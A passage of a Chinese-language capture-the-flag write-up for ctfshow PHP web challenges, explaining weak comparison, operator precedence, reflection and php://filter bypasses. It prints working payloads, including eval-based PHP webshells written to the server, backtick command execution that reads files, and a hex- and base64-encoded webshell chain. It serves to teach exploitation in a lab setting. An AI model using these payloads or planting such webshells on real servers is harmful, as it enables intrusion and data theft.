data)：把一个字符串写入文件中。</strong></li><li><strong>绕过in_array()：当没有指定第三个参数的时候，in_array就相当于&#x3D;&#x3D;，弱类型对比。</strong>（1.php&#x3D;&#x3D;1）</li><li>这段代码的总体意思就是：首先生成一个数组，数组元素随机生成（有区间），GET传参n&#x3D;1.php，POST传参content，内容为<code>&lt;?php @eval($_POST[1]);?&gt;</code></li></ul><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?n=<span class="hljs-number">1</span>.php<br><br>POST：content=<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后蚁剑连接即可拿到flag。</p><hr><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p><a href="https://www.php.net/manual/zh/function.in-array.php">in_array()用法</a></p><p>in_array()函数搜索数组中是否存在指定的值。</p><p>语法：<code>in_array(search,array,type)</code></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">参数描述<br>search必需。规定要在数组搜索的值<span class="hljs-built_in"></span><br><span class="hljs-built_in">array</span>必需。规定要搜索的数组<br>type可选，如果设置该参数为true，则检查搜索的数据与数组的值的类型是否相同<br></code></pre></td></tr></table></figure><p><strong>type ： 类型，true全等 ，false非全等（默认）</strong></p><hr><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h3><p><a href="https://www.php.net/manual/zh/function.file-put-contents.php">file_put_contents()用法</a></p><ul><li>该函数访问文件时，遵循以下规则：</li><li>如果设置了 FILE_USE_INCLUDE_PATH，那么将检查 filename 副本的内置路径</li><li>如果文件不存在，将创建一个文件</li><li>打开文件</li><li>如果设置了 LOCK_EX，那么将锁定文件</li><li>如果设置了 FILE_APPEND，那么将移至文件末尾。否则，将会清除文件的内容</li><li>向文件中写入数据</li><li>关闭文件并对所有文件解锁</li><li>如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">file_put_contents</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$data</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-number">0</span> [, resource <span class="hljs-variable">$context</span> ]] )<br><br>filename： 必需。规定要写入数据的文件。 如果文件不存在，则创建一个新文件。<br>data： 必需。规定要写入文件的数据。可以是字符串、数组或数据流。<br></code></pre></td></tr></table></figure><hr><h2 id="web-100（逻辑运算符优先级、is-numeric）"><a href="#web-100（逻辑运算符优先级、is-numeric）" class="headerlink" title="web-100（逻辑运算符优先级、is_numeric）"></a>web-100（逻辑运算符优先级、is_numeric）</h2><p>源码：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs perl">highlight_file(__FILE__);<br>include(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br><span class="hljs-regexp">//</span>flag in <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>;<br><span class="hljs-variable">$ctfshow</span> = new ctfshow();<br><span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span>=is_numeric(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> is_numeric(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> is_numeric(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-variable">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><br><br>?&gt;<br></code></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">$v0=is_numeric($v1)<span class="hljs-built_in"> and </span>is_numeric($v2)<span class="hljs-built_in"> and </span>is_numeric($v3);<br></code></pre></td></tr></table></figure><p><strong>逻辑运算符的优先级：”&amp;&amp;” &gt; “||” &gt; “&#x3D;” &gt; “and”，等号的优先级高于and，所以v0只跟v1有关系，v2和v3是干扰。</strong></p><p><strong>由于&#x3D;的优先级大于and，因此只要满足v1是个数字，v0就返回1</strong></p><p><strong>所以$v1为数字即可让$v0为True</strong></p><p><strong>所以,让$ctfshow显出来就行了</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-variable">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>通过代码审计，v2是不能带分号的，v3必须带一个分号</strong></p><p>payload：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs smali">/?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;      //利用注释符号/**/然后输出<br>或<br>/?v1=1&amp;v2=&amp;v3=?&gt;&lt;?=`tac ctfshow.php`;      //?&gt;闭合然后反引号执行命令<br>或<br>?v1=1&amp;v2=highlight_file(&#x27;ctfshow.php&#x27;)/*&amp;v3=*/;//通过highlight_file高亮显示输出<br>或<br>http://5ba83a33-fa36-4b9c-b091-da557c318c7f.challenge.ctf.show/?v1=1&amp;v2=eval($_POST[1])/*&amp;v3=*/;//利用蚁剑连接<br><br>使用print_r<br>v1=1&amp;v2=print_r($ctfshow)&amp;v3=;<br></code></pre></td></tr></table></figure><p>注意flag的形式是ctfshow{xxx-xxx-xxx-xxx}</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-number">0x2d</span>      <span class="hljs-comment">//-</span><br><br><span class="hljs-keyword">ctfshow</span>&#123;<span class="hljs-number">7</span>c4e97b8<span class="hljs-number">-43</span>ba<span class="hljs-number">-48</span>af<span class="hljs-number">-8</span>dbb<span class="hljs-number">-5466</span>a0ca6796&#125;  <span class="hljs-comment">//最后一段有12位</span><br></code></pre></td></tr></table></figure><hr><h3 id="逻辑运算符优先级"><a href="#逻辑运算符优先级" class="headerlink" title="逻辑运算符优先级"></a>逻辑运算符优先级</h3><p><a href="https://www.runoob.com/php/php-operators.html">逻辑运算符详解</a></p><p>“&amp;&amp;” &gt; “||” &gt; “&#x3D;” &gt; “and”</p><hr><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h3><p><a href="https://www.php.net/manual/zh/function.is-numeric.php">is_numeric函数详解</a></p><p>用于检测变量是否为数字或数字字符串。<br> 如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">is_numeric</span><span class="hljs-params">(mixed <span class="hljs-variable">$value</span>)</span></span>: bool<br></code></pre></td></tr></table></figure><p>参数</p><ul><li><code>value</code> 需要检测的变量。</li></ul><p>返回值</p><ul><li>如果 <code>value</code> 是数字或数字字符串，    返回 **<code>true</code>**，否则返回 **<code>false</code>**。</li></ul><hr><h2 id="web-101（ReflectionClass反射类）"><a href="#web-101（ReflectionClass反射类）" class="headerlink" title="web-101（ReflectionClass反射类）"></a>web-101（ReflectionClass反射类）</h2><p>源码：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs perl">highlight_file(__FILE__);<br>include(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br><span class="hljs-regexp">//</span>flag in <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>;<br><span class="hljs-variable">$ctfshow</span> = new ctfshow();<br><span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span>=is_numeric(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> is_numeric(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> is_numeric(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\<span class="hljs-variable">$|</span>\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\<span class="hljs-variable">$|</span>\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-variable">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>在上一题的基础上对v2和v3多了很多过滤，$和\*以及反引号都被过滤所以不可以直接输出对象ctfshow、不可以注释、不可以反引号执行。</strong></p><p><strong>但是还可以使用反射类的方法；</strong></p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">v1</span>=1&amp;v2=echo new ReflectionClass&amp;<span class="hljs-attribute">v3</span>=;<br></code></pre></td></tr></table></figure><hr><h3 id="ReflectionClass反射类"><a href="#ReflectionClass反射类" class="headerlink" title="ReflectionClass反射类"></a>ReflectionClass反射类</h3><p><strong>PHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。</strong></p><p>反射类可以说成是类的一个映射，可以利用反射类来代替有关类的应用的任何语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;123123123&#125;&quot;</span>;<br><span class="hljs-keyword">const</span>  PI=<span class="hljs-number">3.14</span>;<br><span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&lt;/br&gt;&quot;</span>;<br>&#125;<br>&#125;<br><br>/有这么一个A类，假设我们不知道这个类是干什么用的，我们需要知道类里面的信息，这时候就需要用到ReflectionClass来对类进行反射<br><span class="hljs-comment">//现在我可以通过反射来获取这个类中的方法，属性，常量</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-string">&#x27;A&#x27;</span>);<span class="hljs-comment">//实例化反射对象,映射A类的信息</span><br><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getConstants</span>());  获取一组常量<br>输出<br> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;PI&quot;</span>]=&gt;<br>  <span class="hljs-keyword">float</span>(<span class="hljs-number">3.14</span>)<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>());    获取类名<br>输出<br><span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;A&quot;</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getStaticProperties</span>()); 获取静态属性<br>输出<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;flag&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">15</span>) <span class="hljs-string">&quot;flag&#123;123123123&#125;&quot;</span><br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getMethods</span>()); 获取类中的方法<br>输出<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">object</span>(ReflectionMethod)<span class="hljs-comment">#2 (2) &#123;</span><br>    [<span class="hljs-string">&quot;name&quot;</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;hello&quot;</span><br>    [<span class="hljs-string">&quot;class&quot;</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;A&quot;</span><br>  &#125;<br>  <br> <br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getProperties</span>());  <span class="hljs-comment">//获取所有属性</span><br><br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="web-102（php伪协议、hex2bin、substr、call-user-func）"><a href="#web-102（php伪协议、hex2bin、substr、call-user-func）" class="headerlink" title="web-102（php伪协议、hex2bin、substr、call_user_func）"></a>web-102（php伪协议、hex2bin、substr、call_user_func）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v4</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v4</span>)&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v3</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p>substr(string, start)：返回字符串的一部分；<br>call_user_func($callback, parameter)：调用函数，第一个参数为被调用的函数，第二个参数为被调用函数所需的参数；<br>file_put_contents(filename, data)：把data数据写入filename。<br>hex2bin()：将十六进制字符转化为ASCII码字符。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-variable">$s</span> = <span class="hljs-keyword">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$str</span> = call_user_func(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$s</span>);<br>    file_put_contents(<span class="hljs-variable">$v3</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-regexp">//</span>主要是这三句话<br>先是第二句话，让变量s过一下<span class="hljs-number">v1</span>函数，变量s 是<span class="hljs-keyword">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);   这句话的意思是从下标为<span class="hljs-number">2</span>的位置获取字符串<br>然后file_put_contents，把str变量给<span class="hljs-number">v3</span><br><br>构造思路：<br><span class="hljs-variable">$v1</span>：这里使用hex2bin()作为回调函数（<span class="hljs-number">16</span>进制转化为字符）<br><span class="hljs-variable">$v2</span>：这里要求全是数字。<br><span class="hljs-variable">$v3</span>：使用PHP伪协议写入文件<br><br><br><span class="hljs-variable">$a</span>=&lt;?=<span class="hljs-string">`cat *`</span>;<br><span class="hljs-variable">$b</span>=base64_encode(<span class="hljs-variable">$a</span>);  <span class="hljs-regexp">//</span> PD89YGNhdCAqYDs=<br><span class="hljs-variable">$c</span>=bin2hex(<span class="hljs-variable">$b</span>);      <span class="hljs-regexp">//</span>等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，=和带着                        =的base64解码出来的内容是相同的。<br>                       bin2hex是把ASCII 字符的字符串转化为<span class="hljs-number">16</span>进制<br>输出   5044383959474e6864434171594473<br>带e的话会被认为是科学计数法，可以通过is_numeric检测。<br>因为是从下标为<span class="hljs-number">2</span>的位置取的字符串，所以要在前面加两个数字（随意）<br><span class="hljs-number">v2</span>=005044383959474e6864434171594473<br></code></pre></td></tr></table></figure><p><strong>整个payload的逻辑就是将经过base64编码、16进制转换后的webshell赋值给v2（16进制后的shell必须为纯数字）,然后调用hex2bin将16进制形式的webshell转化为ASCII码形式（因为base64编码所用的字符属于ASCII，故ASCII码形式的webshell也就是base64形式的webshell）</strong>，然后再使用php伪协议的过滤器，将base64形式的webshell进行解码后，写入到目标文件中。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">php7：<br>?v2=<span class="hljs-number">005044383959474e6864434171594473</span>&amp;v3=php:<span class="hljs-comment">//filter/write=convert.base64-decode/resource=1.php</span><br><br>POST：v1=hex2bin<span class="hljs-comment">//这个就是把16进制转换为ASCII 字符的字符串</span><br>访问<span class="hljs-number">1</span>.php后查看源代码获得flag<br><br><br>php5：<br>在php5中<span class="hljs-number">16</span>进制数是可以被<span class="hljs-title function_ invoke__">is_numeric</span>()（要带<span class="hljs-number">0</span>x前缀）识别的，所以可以绕过<span class="hljs-title function_ invoke__">is_numeric</span>()，但是php7不行，<br>所以如果这题是php5环境<br>所以先用<span class="hljs-title function_ invoke__">bin2hex</span>()将<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span>转为<span class="hljs-number">16</span>进制编码<br><span class="hljs-number">0x3c3f706870206576616c28245f504f53545b315d293b3f3e</span><br><br>?v2=<span class="hljs-number">0x3c3f706870206576616c28245f504f53545b315d293b3f3e</span>&amp;v3=<span class="hljs-number">1</span>.php<br>这里不需要填充两个字符，而且hex2bin可以直接解码<span class="hljs-number">16</span>进制编码<br><br>POST：v1=hex2bin<br>然后蚁剑连接<br></code></pre></td></tr></table></figure><hr><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><p><a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func函数具体详解</a></p><p><code>call_user_func($callback, parameter)</code>：调用函数，第一个参数为被调用的函数，第二个参数为被调用函数所需的参数；</p><p>第一个参数是必须的，第二个参数可选</p><p>call_user_func支持传入数组，且可以用数组来调用静态方法</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ans</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-variable">$ans</span>[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$ans</span>);<br><br><span class="hljs-comment">#输出</span><br>flag<br></code></pre></td></tr></table></figure><hr><h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><p><a href="https://www.php.net/manual/zh/function.substr.php">substr函数详解</a></p><p>substr() 可以截取字符串</p><p>语法</p><pre><code>string substr( $str, start, length); $str ：被截取的字符串。 start ：开始截取的位置。 length ：截取的长度。</code></pre><p>返回值</p><p>截取成功，就返回截取的字符串<br>start 超过字符串长度，就返回 false<br>start 和 length 设置成不合理的截取范围，就返回空字符串<br>substr((xxx),1,1):表示从第1个字母开始，显示1个字母，从1开始计数</p><hr><h3 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin()"></a>hex2bin()</h3><p><a href="https://www.php.net/manual/zh/function.hex2bin.php">hex2bin函数详解</a></p><p><code>hex2bin()</code>：将十六进制字符转化为ASCII码字符。</p><hr><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><a href="https://www.cnblogs.com/hithub/p/16299548.html">CTF之php伪协议以及能使用php伪协议的函数</a></p><h2 id="web-103（同上题）"><a href="#web-103（同上题）" class="headerlink" title="web-103（同上题）"></a>web-103（同上题）</h2><p>相比上一题只是检测了webshell中有没有php字符串</p><p>做法和上题一模一样</p><hr><h2 id="web-104（sha1数组绕过）"><a href="#web-104（sha1数组绕过）" class="headerlink" title="web-104（sha1数组绕过）"></a>web-104（sha1数组绕过）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><span 